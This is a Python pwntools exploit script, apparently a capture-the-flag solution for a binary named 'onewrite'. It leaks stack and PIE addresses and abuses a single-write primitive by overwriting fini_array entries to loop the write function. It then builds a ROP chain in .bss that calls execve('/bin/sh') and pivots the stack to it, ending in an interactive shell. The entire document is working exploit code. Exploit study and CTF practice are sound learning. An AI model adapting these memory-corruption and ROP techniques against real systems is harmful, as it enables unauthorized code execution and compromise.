__author__ = "polaris"

from pwn import *

context.terminal = ['tmux', 'sp', '-h']
#context.log_level = "debug"

p = process("./onewrite1")
elf = ELF("./onewrite")
#gdb.attach(p,"b *0x00007ffff7d4a000+0x08A0F\nb *0x89d3+0x00007ffff7d4a000")

def write(addr,data):
    p.recvuntil("address : ")
    p.send(addr)
    p.recvuntil("data : ")
    p.send(data)

# leak stack
p.recvuntil(" > ")
p.sendline("1")
stack_addr = int(p.recvline().strip(),16)
print "stack_addr:",hex(stack_addr)

write(str(stack_addr+0x18),"\x04")

# leak pie
p.recvuntil(" > ")
p.sendline("2")
pie_base = int(p.recvline().strip(),16)-elf.sym["do_leak"]
print "pie_base:",hex(pie_base)  

fini_addr = pie_base+elf.sym["__do_global_dtors_aux_fini_array_entry"]
do_overwrite = pie_base+elf.sym["do_overwrite"]
csu_fini = pie_base + elf.sym["__libc_csu_fini"]

init_ret = stack_addr-72

write(str(fini_addr+8), p64(do_overwrite))
write(str(fini_addr), p64(do_overwrite))
write(str(init_ret), p64(csu_fini))



init_ret += 8
def write_qword(addr, data):
    global init_ret
    write(str(init_ret), p64(csu_fini))
    init_ret += 8
    write(str(addr), p64(data))

rdi_addr = pie_base + 0x00000000000084fa
rsi_addr = pie_base + 0x000000000000d9f2
rdx_addr = pie_base + 0x00000000000484c5
rax_addr = pie_base + 0x00000000000460ac
syscall_addr = pie_base + 0x000000000006e605

bss_addr = pie_base + 0x2B38D0
rsp_addr = pie_base + 0x000000000000946a

print "bss_addr:",hex(bss_addr)

write_qword(bss_addr,u64("/bin/sh\x00"))
write_qword(bss_addr+8*1,rdi_addr)
write_qword(bss_addr+8*2,bss_addr)
write_qword(bss_addr+8*3,rsi_addr)
write_qword(bss_addr+8*4,0)
write_qword(bss_addr+8*5,rdx_addr)
write_qword(bss_addr+8*6,0)
write_qword(bss_addr+8*7,rax_addr)
write_qword(bss_addr+8*8,59)
write_qword(bss_addr+8*9,syscall_addr)
print "finish"

write_qword(stack_addr,bss_addr+8)
write_qword(stack_addr-8,rsp_addr)

p.interactive()
